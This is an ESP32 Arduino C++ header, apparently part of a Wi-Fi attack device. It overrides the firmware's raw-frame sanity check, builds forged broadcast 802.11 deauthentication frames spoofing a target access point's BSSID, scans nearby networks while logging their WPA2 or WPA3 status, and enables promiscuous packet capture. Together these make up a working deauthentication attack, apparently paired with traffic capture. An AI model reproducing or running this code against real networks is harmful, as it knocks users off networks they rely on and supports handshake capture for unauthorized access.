#pragma once
#include "Arduino.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "vector"
#include "log.h"
#include "display.h"
#include "button.h"
#include "packet_proc.h"

using namespace std;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) { return 0; }

void sendDeauth(Mac bssid) {
	uint8_t deauth_frame[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, MAC2STR(bssid.data()), MAC2STR(bssid.data()), 0x00, 0x00, 0x02, 0x00};
	ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false));
}

void init_wifi() {
	nvs_flash_init();
	esp_netif_init();
	esp_event_loop_create_default();
	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	esp_wifi_init(&cfg);

	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_STA);
	esp_wifi_start();
	
	wifi_promiscuous_filter_t filter;
	wifi_promiscuous_filter_t ctrl_filter;

	filter.filter_mask = FILTER_MASK;
	ctrl_filter.filter_mask = FILTER_MASK_CTRL;

	esp_wifi_set_promiscuous_filter(&filter);
	esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter);
	esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) { addPkt((wifi_promiscuous_pkt_t*)buf); });
	// esp_wifi_set_promiscuous(true) is called in main after scan() completes
}

void scan() {
	digitalWrite(2, HIGH);

	wifi_scan_config_t scan_config = {
		.ssid = NULL,
		.bssid = NULL,
		.channel = 0,
		.show_hidden = true,
		.scan_type = WIFI_SCAN_TYPE_ACTIVE,
		.scan_time = { .active = { .min = SCAN_TIME_MIN, .max = SCAN_TIME_MAX } },
		.home_chan_dwell_time = 1
	};

	printDebugWithTime("Wifi scan started");
	esp_wifi_scan_start(&scan_config, true);
	printDebugWithTime("Wifi scan finished");

	sprite.setTextColor(TFT_GREENYELLOW);
	sprite.println("Done!");
	sprite.pushSprite(0, 0);
	if (debugPauseEnabled) waitForAnyButtonPress();

	uint16_t ap_num = 0;
	esp_wifi_scan_get_ap_num(&ap_num);
	wifi_ap_record_t ap_records[ap_num];
	esp_wifi_scan_get_ap_records(&ap_num, ap_records);

	sprite.fillScreen(TFT_BLACK);
	sprite.setCursor(0, 0);
	sprite.setTextColor(0x7FF0);

	for (int i = 0; i < ap_num; i++) {
		wifi_ap_record_t ap = ap_records[i];
		AP_Info info;
		Mac bssid;
		memcpy(bssid.data(), ap.bssid, 6);
		
		if (find_if(APs.begin(), APs.end(), [&](const AP_Info& x) { return x.bssid == bssid; }) != APs.end()) continue; // jic ig

		info.bssid = bssid;
		info.channel = ap.primary;

		const char* ssid = (ap.ssid[0] == '\0') ? "<Hidden>" : (char*)ap.ssid;
		// const char* prefix = (ap.authmode == WIFI_AUTH_WPA3_PSK) ? "W3_" : (ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK) ? "W23_" : "";

		// snprintf(info.ssid, AP_SSID_MAX_LEN + 1, "%s%.*s", prefix, (int)(AP_SSID_MAX_LEN - strlen(prefix)), ssid);
		snprintf(info.ssid, AP_SSID_MAX_LEN + 1, "%.*s", AP_SSID_MAX_LEN, ssid);

		info.wpa3Stuffs.hasWPA3 = (ap.authmode == WIFI_AUTH_WPA3_PSK) ? 1 : (ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK) ? 2 : (ap.authmode == WIFI_AUTH_OPEN ? -1 : 0);
	
		APs.push_back(info);
		if (find(channels.begin(), channels.end(), ap.primary) == channels.end()) channels.push_back(ap.primary);

		sprite.printf("Ch %-2d|", ap.primary);
		sprite.setTextColor(colorizeRSSI(ap.rssi));
		sprite.print(ap.rssi);
		sprite.setTextColor(0x7FF0);
		sprite.printf("|%s\n", info.ssid);
	}
	if (channels.empty()) {
		for (int i = 1; i <= 13; i++) channels.push_back(i);
		sprite.println("No AP Found.");
	}
	sprite.pushSprite(0, 0);
	esp_wifi_set_channel(channels[channelIndex], WIFI_SECOND_CHAN_NONE);
	digitalWrite(2, LOW);
}
